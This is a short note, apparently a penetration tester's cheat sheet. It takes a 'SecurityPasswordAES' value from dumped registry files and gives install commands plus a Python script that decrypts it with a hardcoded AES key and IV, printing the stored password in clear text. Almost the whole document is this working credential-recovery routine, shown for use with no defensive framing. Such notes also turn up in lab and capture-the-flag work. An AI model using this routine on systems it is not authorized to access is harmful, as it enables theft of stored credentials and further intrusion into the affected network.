From dumped reg files:

"SecurityPasswordAES"=hex:2c,0f,ff,76,ca,03,d7,c2,1c,0d,3c,8b,55,ed,d8,de,37,\
  f8,97,20,ae,6e,d3,82,d0,ad,2e,70,f9,7e,ff,ea,0b,0c,1c,d9,01,cb,d1,ad,90,fc,\
  60,1b,9e,40,fc,9c,4b,af,65,ee,c5,19,62,eb,4e,da,cc,7c,30,a8,a6,6b,0c,bd,9f,\
  36,2a,c0,ca,d1,59,89,04,ae,cb,8b,96,10

Place above value into hex_str_cipher below:

```bash - kali
pip3 install hexdump
```

```bash - kali
pip3 install pycrypto
```

```python - kali
import sys, hexdump, binascii
from Crypto.Cipher import AES

class AESCipher:
    def __init__(self, key):
        self.key = key

    def decrypt(self, iv, data):
        self.cipher = AES.new(self.key, AES.MODE_CBC, iv)
        return self.cipher.decrypt(data)

key = binascii.unhexlify("0602000000a400005253413100040000")
iv = binascii.unhexlify("0100010067244F436E6762F25EA8D704")

# Hex Cipher String
hex_str_cipher = "2C0FFF76CA03D7C21C0D3C8B55EDD8DE37F89720AE6ED382D0AD2E70F97EFFEA0B0C1CD901CBD1AD90FC601B9E40FC9C4BAF65EEC51962EB4EDACC7C30A8A66B0CBD9F362AC0CAD1598904AECB8B9610"

ciphertext = binascii.unhexlify(hex_str_cipher)

raw_un = AESCipher(key).decrypt(iv, ciphertext)

print(hexdump.hexdump(raw_un))

password = raw_un.decode('utf-16')
print(password)

```

